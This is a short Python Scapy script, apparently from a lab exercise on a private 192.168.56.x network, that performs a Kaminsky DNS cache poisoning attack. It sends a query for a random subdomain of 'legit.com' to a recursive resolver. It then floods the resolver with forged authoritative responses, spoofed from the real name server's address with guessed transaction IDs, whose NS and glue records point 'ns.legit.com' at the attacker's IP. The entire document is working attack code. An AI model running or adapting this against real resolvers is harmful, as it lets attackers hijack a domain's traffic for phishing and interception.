from scapy.all import *
import random
import copy

packets = 0x40
i = 0

auth = "192.168.56.101"
attacker = "192.168.56.102"
rec = "192.168.56.103"
spoof = "192.168.56.104"

#take input for ww'x' value
www = raw_input("input ww. :")

#create request packet for attacker.com
dns_req = Ether()/IP(dst=rec, src = attacker)
dns_req = dns_req/UDP(dport = 53)
dns_req = dns_req/DNS(id = 5, aa=0L, z=0L, qdcount=1, ancount=0, qd=(DNSQR(qname= 'ww'+ www +'.legit.com',qtype='A',qclass='IN')))

sendp(dns_req, iface="enp0s3")
hexval = raw_input("enter hex value: ")
hexval = int(("0x" + hexval), 16)

#create kaminsky packet and array for packets
idbase = hexval - 20
kaminsky_arr = []
for x in xrange(packets):
	kaminsky = Ether()/IP(dst=rec, src = auth)
	kaminsky = kaminsky/UDP(dport = 1053)
	kaminsky = kaminsky/DNS(id = (idbase + x) % 0x10000  , aa = 1, rd = 0, ra= 0, qd = dns_req[DNS].qd, qr = 1, qdcount =1, nscount=1, arcount=2, cd =1,
							ns =(DNSRR (rrname = 'legit.com.', type= 'NS', rclass = 'IN', rdata = 'ns.legit.com.')), 
							ar = (DNSRR(rrname = 'ns.legit.com.', type = 'A', rclass='IN',rdata=attacker)/DNSRROPT(rdlen = 0, rrname='.', type = 'OPT', rclass=4096, z='D0')))	
	kaminsky_arr.append(kaminsky)

#send all packets
sendp(kaminsky_arr, iface="enp0s3", verbose = 0)
